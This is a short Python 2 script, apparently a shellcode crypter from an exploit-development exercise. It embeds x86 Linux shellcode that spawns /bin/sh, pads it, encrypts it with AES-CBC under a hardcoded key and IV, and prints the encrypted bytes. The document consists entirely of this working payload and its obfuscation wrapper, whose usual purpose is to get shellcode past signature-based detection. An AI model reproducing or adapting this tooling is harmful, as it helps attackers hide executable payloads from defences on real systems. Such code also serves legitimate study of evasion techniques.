from Crypto.Cipher import AES

shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53\x89\xe1\xcd\x80"

shellcodeLen = len(shellcode)
lengthOfPadding = 16 - shellcodeLen % 16

padElement="\xA1"
completePad  = padElement *lengthOfPadding
shellcode += completePad

obj = AES.new('This is a key123', AES.MODE_CBC, "1234567812345678")
ciphertext = obj.encrypt(shellcode)
encoded=""
for x in bytearray(ciphertext):
    encoded += '\\x'
    encoded += '%02x' % x
print "Encrypted shellcode = " + encoded 
print "Padding = "+ str(lengthOfPadding)
